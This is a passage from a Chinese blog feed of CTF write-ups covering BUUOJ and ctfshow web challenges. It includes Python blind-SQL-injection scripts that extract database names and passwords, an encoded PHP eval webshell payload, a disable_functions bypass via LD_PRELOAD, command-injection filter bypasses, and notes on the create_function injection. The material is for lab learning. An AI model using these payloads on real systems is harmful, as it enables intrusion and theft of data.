src="2.PNG"></p><p>我输入的是/index.php/text.php?s</p><p>返回的是text.php，页面解析的是index.php</p><p><a href="https://bugs.php.net/bug.php?id=62119">basename存在bug</a></p><blockquote><p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php<br>var_dump(basename(“config.php/xff”)); // =&gt; config.php</p></blockquote><p><img src="3.PNG"></p><p><img src="4.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>成绩查询机</title>
      <link href="/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/"/>
      <url>/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php&#39;</span><br><span class="line"></span><br><span class="line">#print(requests.get(url&#x3D;url,params&#x3D;params).text)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   min&#x3D;32</span><br><span class="line">   max&#x3D;128</span><br><span class="line">   mid&#x3D;(min+max)&#x2F;&#x2F;2</span><br><span class="line">   while min&lt;max:</span><br><span class="line">       payload&#x3D;&quot;http:&#x2F;&#x2F;e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn&#x2F;?stunum&#x3D;0^(ascii(substr(database(),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">       re&#x3D;requests.get(url&#x3D;payload).text</span><br><span class="line">       if &#39;Hi admin, your score is: 100&#39; in re:</span><br><span class="line">           min&#x3D;mid+1</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">       else:</span><br><span class="line">           max&#x3D;mid</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">   if mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;127:</span><br><span class="line">       break</span><br><span class="line">   flag&#x3D;flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>爆库</p><p>ctf</p><p>payload=”<a href="http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0%5E(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p>flag,score</p><p>payload=”<a href="http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0%5E(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p>flag,value</p><p>payload=”e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(value))from(ctf.flag)),%d,1))&gt;%d)”%(i,mid)</p><p>得到flag.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战-final-sql</title>
      <link href="/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/"/>
      <url>/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>这是关于盲注的一道题，打算练练这一方面的题目，顺便联系一下写python脚本</p><p>二分法注入，异或注入</p><p><img src="1.PNG"></p><p>其实提示的很明显了。sql盲注</p><p>id=1  NO! Not this! Click others~~~ …..</p><p>当id=7的时候，显示ERROR!!!</p><p>id=0^1，显示的跟id=1一样，id=0^0,是ERROR，所以可以根据这一点来接脚本进行爆破</p><p><img src="2.PNG"></p><p>fuzz被禁用的</p><blockquote><p>空格<br>and<br>mid<br>like<br>union<br>char<br>insert<br>into<br>/**/<br>by<br>having</p></blockquote><p>爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php&#39;</span><br><span class="line"></span><br><span class="line">#print(requests.get(url&#x3D;url,params&#x3D;params).text)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   min&#x3D;32</span><br><span class="line">   max&#x3D;128</span><br><span class="line">   mid&#x3D;(min+max)&#x2F;&#x2F;2</span><br><span class="line">   while min&lt;max:</span><br><span class="line">       payload&#x3D;&quot;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php?id&#x3D;0^(ascii(substr(database(),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">       re&#x3D;requests.get(url&#x3D;payload).text</span><br><span class="line">       if &#39;NO! Not this! Click others~~~&#39; in re:</span><br><span class="line">           min&#x3D;mid+1</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">       else:</span><br><span class="line">           max&#x3D;mid</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">   if mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;127:</span><br><span class="line">       break</span><br><span class="line">   flag&#x3D;flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>虽然是仿照别人写的，但是很开心，因为这是第一次自己写的脚本在题目上用上了。</p><p><img src="3.PNG"></p><p>空格被过滤了还不允许用注释符</p><p>ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=’geek’))))</p><p>报表</p><p>payload=”<a href="http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0%5E(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p><img src="4.PNG"></p><p>节省时间，因为提前知道flag在第一个表中</p><p>爆字段</p><p>payload=”<a href="http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0%5E(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p><img src="5.PNG"></p><p>直接爆password</p><p>payload=”<a href="http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0%5E(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),%25d,1))&gt;%25d)&quot;%25(i,mid)">http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p><img src="6.PNG"></p><p>得到flag</p><p>#后记</p><p>为什么这道题目可以利用异或盲注</p><p>首先没有过滤^,而且我们可以发现1^0,和1^1的结果是不一样的，所以我们可以根据页面返回的结果来调整二分法</p><p>另外我认为做sql还要成功的找到注入点</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE ME</title>
      <link href="/2021/03/29/ME/"/>
      <url>/2021/03/29/ME/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">   $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">   if(strlen($code)&gt;40)&#123;</span><br><span class="line">       die(&quot;This is too Long.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">       die(&quot;NO.&quot;);</span><br><span class="line">                                               &#125;</span><br><span class="line">       @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">      highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure><p>这个是过滤了字母数字，跟前几天学的那个常见的php绕过方法一样，所以我们可以采用取反或者异或来进行</p><p>抑或显然不大行，因为有字符串的长度限制，但是我们可以本地进行测试</p><p>$<em>=GET:(‘%07’^’%40’).(‘%05’^’%40’).(‘%09’^’%5d’)<br>$__=’</em>‘.(‘%07’^’%40’).(‘%05’^’%40’).(‘%09’^’%5d’)//<em>GET<br>$$__=$<em>GET<br>code=$$</em></em>[1]<br>?code=$<strong>=’<em>‘.(‘%07’^’%40’).(‘%05’^’%40’).(‘%09’^’%5d’);$$__[1];&amp;1=phpinfo();<br>$</em>=(‘%01’^’%60’).(‘%08’^’%7b’).(‘%08’^’%7b’).(‘%05’^’%60’).(‘%09’^’%7b’).(‘%08’^’%7c’);$</strong>=’<em>‘.(‘%07’^’%40’).(‘%05’^’%40’).(‘%09’^’%5d’);$__</em>=$$<strong>;$<em>($</em></strong>[<em>]);&amp;</em>=phpinfo();</p><p>异或不成功，我也很异或呢。。。。。。</p><p>那我们就直接取反把，为什么可以进行取反，是因为取反后的字符时不可见字符，所以我们可以绕过正则匹配</p><p>先查看一下phpinfo(),看有没有什么进行rce的命令被禁用了</p><p>?code=(~%8F%97%8F%96%91%99%90)();</p><p><img src="1.PNG"></p><p>总之，就是会的和不会的都被禁用了</p><pre><code>    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>总之，就是我会的不会的都被禁用了</p><p><a href="https://www.dougua.net/a/7712.html">disable_functions函数详解</a>，这篇文章以后还是看一下吧</p><p>禁用函数我理解的就是简单的绕过，比如拼接绕过什么什么的都是不能再使用了，所以我就没有办法了。。。</p><p>看WP，我们可以进行构造一个木马</p><p>assert: (~%9E%8C%8C%9A%8D%8B)</p><p>(eval($_POST[a]))=(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6)</p><p>(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);<br>这里有两个点</p><li>assert与eval的区别：assert里面是表达式，比如assert('echo(1)')是对的，但是assert('echo(1);'),就是错的<p>eval与assert正好相反，eval里面是字符串，eval(‘echo(1);’)这是对的</p><p>而且在url中%9E之类的字符串的长度是1，其他的也是1，所以成功的没有到达最大限制长度</p><p><img src="2.PNG"></p><p>成功连接上木马后，我们发现，有两个似乎对我们有用的文件，但是第一个是空的，第二个一堆乱码，那我们连接这个木马，争这个shell就没有什么用处了</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>我们可以对比一下这两张图，我们可以发现因为这道题目disable_functions禁用的太多了，以至于我们连接木马是没有什么用处的，所以我们现在只能做的就是如何去绕过这个disable_functions去执行我们的命令</p><p><a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD &amp; putenv() </a></p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE</p><p>于是在tmp中上传我们的文件</p><p><img src="5.PNG"></p><p><a href="https://codechina.csdn.net/mirrors/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=csdn_github_accelerator">github地址</a></p><p>(别忘了，文件放在下载里面了)</p><p><img src="6.PNG"></p><p>得到flag</p><p>4.1</p><p>整理了下思路，打开看到过滤的情况是[A-Z0-9a-z],所以采用去去翻绕过，先去查看phpinfo,查看过滤了什么函数，发现禁用了我们很多的函数，想去构造一个后门，通过连上蚁剑，去查看flag.<br>assert: %9E%8C%8C%9A%8D%8B<br>(eval($_POST[a])):%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6</p><?php eval($_POST[a]);?><p>我刚才又想尝试说直接传入?code=$_POST[a],取反嘛，但是很不幸没有成功。<br>连上蚁剑之后我们可以发现，就是我们想要的东西没有实现，因为我们可以在蚁剑上试一试，就是什么命令都执行不了，所以我们就只能去绕过这个disable_function,上传点是蚁剑的var/tmp，上传之后我们再一次去执行命令</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web 41-45</title>
      <link href="/2021/03/27/ctfshow-web41/"/>
      <url>/2021/03/27/ctfshow-web41/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>奇奇怪怪的知识又增加了</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;c&#39;]))&#123;</span><br><span class="line">   $c &#x3D; $_POST[&#39;c&#39;];</span><br><span class="line">if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;</span><br><span class="line">       eval(&quot;echo($c);&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>好家伙再一次把我会的都过滤了</p><p>这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。</p><p>(‘%13%19%13%14%05%0D’|’%60%60%60%60%60%60’)</p><h2>web42</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">      $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>2>&1```,就是把所有的输出不管是对的还是错的都丢弃了，所以我们要做的就是把后边的东西进行截断</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以进行截断的有，&#39;;&#39;,&#39;%0a&#39;,&#39;||&#39;;</span><br><span class="line"></span><br><span class="line">就是?c&#x3D;ls;  ls%0a  ls||</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web43&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">跟上面一样</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web44&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看到，flag被过滤了，我们可以使用sort f*%0a来进行绕过</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web45&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sort$&#123;IFS&#125;$9f*%0a&lt;br&gt;</span><br><span class="line">sort$&#123;IFS&#125;f*%0a&lt;br&gt;</span><br><span class="line">sort%09f*%0a&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web46&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>if(isset($_GET[&#39;c&#39;]))&#123;   $c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">很是异或，为啥*被过滤了我用？就不行！！！</span><br><span class="line"></span><br><span class="line">非要&#39;&#39;</span><br><span class="line"></span><br><span class="line">sort&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line">sort&lt;fl&#39;&#39;ag.php%oa</span><br><span class="line">nl&lt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web47&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125; </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web48&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">tac&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web49&lt;&#x2F;h2&gt;</span><br><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%||</span><br><span class="line"></span><br><span class="line">tac&lt;&gt;fl&#39;&#39;ag.php%||</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web50&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><p>```<br>nl&lt;&gt;fl’’ag.php%||</p><p>tac&lt;&gt;fl’’ag.php%||</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php代码执行中出现过滤限制的绕过执行方法</title>
      <link href="/2021/03/25/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0h%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/"/>
      <url>/2021/03/25/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0h%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>这是一位大佬写的，<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">原文地址</a>，深入学习一下</p><span id="more"></span><blockquote><p>本篇文章总结了大佬在比赛中碰到过的各种代码绕过执行的方法</p></blockquote><h2>代码执行函数</h2><li>eval()<p>最常见的代码执行函数，把字符串code当作php代码执行。</p><blockquote><p>eval(string $code): mixed</p></blockquote><li>assert()<p>判断一个断言是否是false</p><blockquote><p>PHP 5</p></blockquote><p>assert ( mixed $assertion [, string $description ] ) : bool</p><blockquote><p>PHP 7</p></blockquote><p>assert ( mixed $assertion [, Throwable $exception ] ) : bool</p><p>assert()会检查指定的assertion()，并在结果为false的时候采取适当的行动，在php5，php7中如果assertion是字符串，会被当作php代码执行</p><li>preg_replace()+/e<p>执行一个正则表达式的搜索和替换</p><blockquote><p>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</p></blockquote><p>这个匹配subject，将pattern替换为replacement，如果pattern中有采用“/e”模式，那么就会将replacement当成php代码执行（这种“/e”模式在php7中被移除）</p><p><img src="1.png"></p><p><img src="2.PNG"></p><li>create_function()<p>创建一个匿名（lambda样式）函数</p><blockquote><p>create_function ( string $args , string $code ) : string</p></blockquote><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤。攻击者可以构造payload传递给create_function()对参数或函数体闭合注入恶意代码导致代码执行。</p><p><a href="https://blog.csdn.net/dyw_666666/article/details/90042852">关于create_function更详细的解释</a></p><p>string $args 变量部分</p><p>string $code 方法代码部分</p><p><img src="3.png"></p><p>就相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">funtion newfunc($fname)&#123;</span><br><span class="line">echo $fname.&quot;Chen&quot;;</span><br><span class="line">&#125;</span><br><span class="line">newfunc(&quot;Keyan &quot;);</span><br></pre></td></tr></table></figure><p>官方给的例子</p><blockquote><?php</blockquote><p>$newfunc = create_function(‘$a,$b’, ‘return “ln($a) + ln($b) = “ . log($a * $b);’);</p><blockquote><p>echo “New anonymous function: $newfunc”;</p></blockquote><blockquote><p>echo $newfunc(2, M_E) ;<br>?&gt;</p></blockquote><p>我们先看一段有问题的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$str2&#x3D;&#39;echo  &#39;.$a.&#39;test&#39;.$id.&quot;;&quot;;</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$f1 &#x3D; create_function(&#39;$a&#39;,$str2);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们可以构造恶意代码?id=;}phpinfo();/*</p><blockquote><p>源代码：<br>function fT($a)</p></blockquote><blockquote><p>{<br>  echo “test”.$a;<br>}</p></blockquote><blockquote><p>注入后代码：<br>function fT($a) {</p></blockquote><blockquote><p>echo “test”;}</p></blockquote><p>  phpinfo();/*;//此处为注入代码。</p><blockquote><p>}</p></blockquote><p><img src="4.PNG"></p><p>php7.4.3还是有这个漏洞的</p><h2>可回调函数</h2><li>array_map()<p>为数组的每个元素应用回调函数</p><blockquote><p>array_map ( callable $callback , array $array , array …$arrays ) : array</p></blockquote><p>返回数组，是为array每个元素应用callback函数之后的数组。 